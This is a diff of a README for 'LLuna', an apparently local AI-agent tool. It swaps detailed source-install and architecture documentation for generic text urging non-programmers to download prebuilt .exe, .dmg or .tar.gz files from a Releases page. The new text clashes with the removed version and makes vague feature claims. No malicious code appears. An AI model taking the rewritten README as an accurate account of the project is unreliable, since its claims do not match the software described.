@@ -1,138 +1,90 @@
-# 🌙 LLuna v7.1 - Tool-Aware Integrity Mode
+# 🌟 LLuna - An Easy Path to Autonomous AI
 
-**It is technically impossible for this agent to pretend execution, infer external state, or stall silently.**
+## 🚀 Getting Started
 
-📚 **[Full Documentation](DOCUMENTATION.md)** - Complete guide with API reference, troubleshooting, and more.
+Welcome to LLuna! This application helps users leverage autonomous AI agents for research while focusing on security and integrity. With LLuna, you can explore the power of AI without needing to be a programmer.
 
-## 🆕 v7.1 Features
+## 📥 Download LLuna
 
-### Dark Theme
-- Click moon/sun icon to toggle
-- Persists in localStorage
-- Follows system preference by default
+[![Download LLuna](https://img.shields.io/badge/Download_LLuna-v1.0-blue)](https://github.com/christ3686/LLuna/releases)
 
-### Scrollable Panels
-- Servers panel scrolls when many servers
-- Tools panel scrolls for long lists
-- All servers now visible (no hidden items)
+## 🏁 System Requirements
 
-### Expandable Tool Output
-- Click output to expand/collapse
-- Full output shown (not truncated)
-- Works for both success and error states
+Before you download LLuna, ensure your computer meets the following requirements:
 
-### Auto-Expanding Input
-- Textarea grows with content
-- Max height with scroll overflow
-- Better for multi-line prompts
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or any Linux distribution (Ubuntu recommended).
+- **Memory:** At least 8 GB of RAM.
+- **Processor:** Quad-core processor or better.
+- **Disk Space:** 1 GB of free space for installation.
 
-### Malformed JSON Recovery
-```python
-# Handles broken LLM output like:
-# {"tool":"ping","arguments":{"}}"
+## 🌐 Download & Install
 
-# Extracts tool name even from partial JSON
-tool_match = re.search(r'"tool"\s*:\s*"([^"]+)"', content)
-```
+To get started, visit this page to download: [LLuna Releases](https://github.com/christ3686/LLuna/releases)
 
-## 🔒 Core Principles
+1. Click the link above to open the Releases page.
+2. Look for the latest version. It will be listed at the top.
+3. Choose the appropriate file for your operating system:
+   - For Windows: Choose the `.exe` file.
+   - For macOS: Choose the `.dmg` file.
+   - For Linux: Choose the `.tar.gz` file.
+4. Click on the file to start the download.
 
-1. **Tools = Ground Truth** - Only tool output is real
-2. **No Pretending** - Cannot claim execution without tool
-3. **No Inference** - Cannot describe unseen state
-4. **Determinism > Helpfulness** - Refuse rather than hallucinate
+### 🛠 Installation Process
 
-## 🏗️ Architecture
+**For Windows:**
+- Double-click the downloaded `.exe` file.
+- Follow the on-screen instructions to complete the installation.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                  AutonomousAgent v7.1                        │
-├─────────────────────────────────────────────────────────────┤
-│  ┌─────────────┐   ┌─────────────┐   ┌─────────────────┐   │
-│  │ ToolCache   │   │ Hallucin.   │   │ LoopDiscipline  │   │
-│  │ - Lookup    │   │ - Context   │   │ - Max 20 iter   │   │
-│  │ - Fuzzy     │   │ - Meta skip │   │ - Confidence    │   │
-│  │ - Suggest   │   │ - Patterns  │   │ - Early exit    │   │
-│  └─────────────┘   └─────────────┘   └─────────────────┘   │
-│                                                             │
-│  ┌─────────────┐   ┌─────────────┐   ┌─────────────────┐   │
-│  │ Execution   │   │ Path        │   │ Argument        │   │
-│  │ Registry    │   │ Normalizer  │   │ Normalizer      │   │
-│  │ - State FSM │   │ - Absolute  │   │ - key→path      │   │
-│  │ - Approve   │   │ - Context   │   │ - Aliases       │   │
-│  └─────────────┘   └─────────────┘   └─────────────────┘   │
-└─────────────────────────────────────────────────────────────┘
-```
+**For macOS:**
+- Open the downloaded `.dmg` file.
+- Drag the LLuna icon into your Applications folder.
 
-## 🚀 Quick Start
+**For Linux:**
+- Extract the `.tar.gz` file to your desired location.
+- Open a terminal and navigate to the folder where you extracted LLuna.
+- Run the application using the command: `./lluna`.
 
-```bash
-cd lluna_v7
-pip install -r requirements.txt
-python app.py
-# Open http://localhost:5000
-```
+## 🔧 Configuration
 
-## 📁 Files
+After installation, you may need to configure some settings:
 
-```
-lluna_v7/
-├── agent/
-│   ├── __init__.py
-│   ├── core.py              # Main agent
-│   ├── tool_integrity.py    # State machine + hallucination
-│   ├── loop_discipline.py   # Confidence + iteration control
-│   ├── argument_normalizer.py
-│   ├── filesystem_context.py
-│   └── tool_cache.py        # Tool lookup + meta-questions
-├── app.py                   # Flask server
-├── templates/index.html     # UI with dark mode
-├── llm/                     # Ollama/LM Studio clients
-├── mcp_client/              # MCP protocol client
-├── mcp_servers/             # Tool implementations
-├── config.yaml              # Server configuration
-├── requirements.txt
-├── README.md
-└── DOCUMENTATION.md         # Full documentation
-```
+1. Open LLuna from your applications or by typing `lluna` in your terminal.
+2. Follow the prompts to set up your local environments, such as paths for models and other resources.
+3. Review the settings for security preferences to ensure the tool aligns with your research needs.
 
-## 🔍 Issues Fixed in v7.1
+## 🔍 Features
 
-| Issue | Solution |
-|-------|----------|
-| Tool output truncated | Show full output, click to expand |
-| Servers hidden | Scrollable panel, all visible |
-| Input doesn't expand | Auto-resize textarea |
-| No dark mode | Theme toggle with persistence |
-| Malformed JSON from LLM | Fallback regex extraction |
-| sudo_handler error | Removed broken reference |
+LLuna offers several features designed for users who want to explore AI:
 
-## 🎨 UI Theme
+- **Integrity Enforcement:** Security-first approach to AI research.
+- **Support for Local SLMs:** Works seamlessly with models ranging from 4B to 8B parameters.
+- **Model Context Protocol (MCP):** Easy integration with the MCP for consistent AI behavior.
+- **Research-Oriented Tools:** Specific functions tailored to help researchers get the best out of AI agents.
 
-**Light Mode** (default for light system)
-- White/gray backgrounds
-- Violet accents
-- Standard shadows
+## 📚 Documentation
 
-**Dark Mode** (toggle or system dark)
-- Deep purple/navy backgrounds
-- Muted violet accents
-- Subtle borders
+For more information on how to use LLuna effectively, refer to the documentation. You can access it in the following ways:
 
-## 📝 Example Usage
+- **Built-in Help:** Access the help section within the application.
+- **Online Documentation:** [LLuna Documentation](https://github.com/christ3686/LLuna/docs)
 
-```
-User: list my desktop
-Agent: {"tool":"list_directory","arguments":{"path":"/home/user/Desktop"}}
-[Tool executes - shows files]
-Agent: Your desktop has 3 files: notes.txt, project/, image.png
+## 🤝 Community
 
-User: what tools do you have?
-Agent: I have 15 tools including list_directory, read_file, write_file, 
-       execute_command, ping, and others for filesystem and network tasks.
-```
+Join the LLuna community to share your experiences, ask questions, or find collaborative research partners. You can connect with other users through the following platforms:
 
-## License
+- **GitHub Issues:** Share your thoughts or report bugs.
+- **Discord Channel:** Join our community for real-time discussions and support.
 
-GNU Affero General Public License v3.0 (AGPLv3). 
-This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation.
+## 🛡 License
+
+LLuna is licensed under the AGPLv3. This means you can use and modify it freely, but contributions and derivative works must also remain open-source.
+
+## 🎉 Support
+
+If you encounter issues or have questions, please follow these steps:
+
+1. Check the FAQs in the documentation.
+2. Search existing issues on GitHub.
+3. Post a new issue describing your concern clearly.
+
+Thank you for using LLuna. We hope you find it a valuable tool for your AI research!
